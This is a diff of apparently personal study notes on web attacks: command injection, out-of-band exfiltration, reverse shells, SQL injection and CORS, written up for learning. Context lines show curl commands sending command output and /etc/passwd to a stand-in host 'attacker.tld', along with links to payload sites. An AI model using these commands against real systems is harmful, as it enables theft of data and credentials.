@@ -8,6 +8,7 @@ first of all have a look at [payloads all the things](https://github.com/swissky
 ## Command Injection
 ### Basics
 whenever we see a suspicious input, we fuzz it. we need to use command separators.
+> [!NOTE]
 > Recon means try to detect the injection. *it coms from recognize*
 ```console
 ; #cut the befoce cmd
@@ -40,6 +41,7 @@ For Data Exfiltration (extracting data) u should use these two:
 - DNS Data Exfiltration
 
 #### HTTP
+> [!TIP]
 > search request catcher to get a simple server for testing out of bound.
 
 for sending a command or file use these two:
@@ -48,7 +50,8 @@ curl https://attacker.tld -d $(cmd) # for cmd result
 curl https://attacker.tld --data-binary @/etc/passwd # for sending file
 ```
 #### DNS
->  look for dns logger to get dns requests (DNS). an example is [DNSbin](dnsbin.zhack.ca)
+> [!TIP]
+> look for dns logger to get dns requests (DNS). an example is [DNSbin](dnsbin.zhack.ca)
 
 command is:
 ```console
@@ -64,8 +67,10 @@ Procedure:
 - victim spawns a shell
 - attacker will have the shell
 
+> [!TIP]
 > look at this [site](revshells.com) for get some payload.
 
+> [!NOTE]
 > commix is sth like sqlmap :)
 
 
@@ -90,8 +95,7 @@ we have three kind of intraction between web app and sql.
 - nothing returns to user
 
 #### Direct
-look at this example:
-> https://site.com/news/54
+look at [this example](https://site.com/news/54):
 
 in this case 54 is id of a data in sql so the qury must be like one of this:
 ```sql
@@ -131,6 +135,11 @@ Based on user privilage we can do many things:
 for extracting data u should know, ***data base name***, ***table name*** and ***column name***.
 
 > **sqli** -> extract database names -> extract table names -> extract column names -> **pulling out data**
+
+```mermaid
+Title: Flow of sqli extracting data.
+A->B: hi
+```
 
 we can pull information with **information_schema**:
 - `SELECT schema_name FROM information.schema.schemata` -> shows all database which the user has access to
@@ -329,5 +338,6 @@ when u see `Access-Control-Allow-Origin: https://attacker.com` and `Access-Contr
 
 <details>
 <summary>Let's Read</summary>
+
 > see [this](https://www.youtube.com/watch?v=AUQSYobXbZI) for better view *(part of CORS misconfiguration)*.
 </details>
